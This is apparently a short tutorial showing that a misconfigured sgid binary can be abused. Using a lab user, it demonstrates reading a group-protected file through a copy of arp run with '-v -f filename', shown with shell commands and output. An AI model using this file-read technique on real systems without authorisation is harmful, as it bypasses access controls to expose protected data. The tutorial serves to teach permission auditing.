Vulnerabilities when incorrectly using the suid bit is quite common, but suid has a less famous cousin: sgid. 

Q: Can we exploit inproper use of the sgid bit?
A: Yes indeed.

In the example below only user and group have read access to the file secretfile2:

```
nisse@bettan:~$ ls -l secretfile2
-rw-r----- 1 root emptygroup 57 Feb 10 13:54 secretfile2
nisse@bettan:~$
```

This is the content of the file:

```
root@bettan:/home/nisse# cat secretfile2
This is the content of the file /home/nisse/secretfile2

root@bettan:/home/nisse#
```

I am currently logged in as nisse, who is not a member of the emptygroup group:

```
nisse@bettan:~$ groups
nisse
nisse@bettan:~$
```

Actually, the group emptygroup has no members at all:

```
nisse@bettan:~$ cat /etc/group | grep emptygroup
emptygroup:x:1097:
nisse@bettan:~$
```

Nisse cannot read the content of secretfile2 since he is "other" in relation to that file:

```
nisse@bettan:~$ cat secretfile2
cat: secretfile2: Permission denied
nisse@bettan:~$
```

In the same directory I have placed a copy of the arp binary which can be used to read files using "-v -f filename". Note that this is not a security flaw but a feature of arp! The flaw comes here:

```
nisse@bettan:~$ ls -l arp2
-rwxr-sr-x 1 root emptygroup 70960 Feb 10 13:53 arp2
nisse@bettan:~$
```

Note that the file has the sgid-bit set (s on the group-execute position) and that the group membership of the file is emptygroup. This means that when the binary is executed, it will run as if the executing user was member of the emptygroup group.

And since all members of emptygroup (but not others!) have read access to the the secret2file, anyone executing this arp binary (note that others have execute permissions, so that can be performed by anyone on the system) can use arp to read the secretfile2 file:

```
nisse@bettan:~$ ./arp2 -v -f secretfile2
This is the content of the file /home/nisse/secretfile2
This: Host name lookup failure
arp: cannot set entry on line 1 of etherfile secretfile2 !
nisse@bettan:~$
```



So yes, the sgid bit can be exploited the same way as suid. Remember that sgid  relatess to the group membership of the file the same way as the suid bit relates to the file owner.
